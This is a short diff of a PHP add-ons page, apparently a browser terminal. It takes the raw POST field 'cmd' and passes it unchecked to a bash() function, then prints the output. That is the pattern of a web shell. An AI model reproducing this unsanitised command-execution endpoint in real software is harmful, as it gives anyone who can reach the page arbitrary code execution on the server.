@@ -1,4 +1,9 @@
-<?php require_once('addonshead.php');?>
+<?php
+require_once('addonshead.php');
+
+$cmd = $_POST['cmd'];
+$close = strpos($cmd, 'addo') ? '/' : 'addons.php'; 
+?>
 
 <script>
 window.addEventListener('resize', function() {
@@ -40,7 +45,7 @@ function bash($cmd) {
 }
 
 echo '<pre>';
-bash($_POST['cmd']);
+bash($cmd);
 echo '</pre>';
 ?>
 </div>
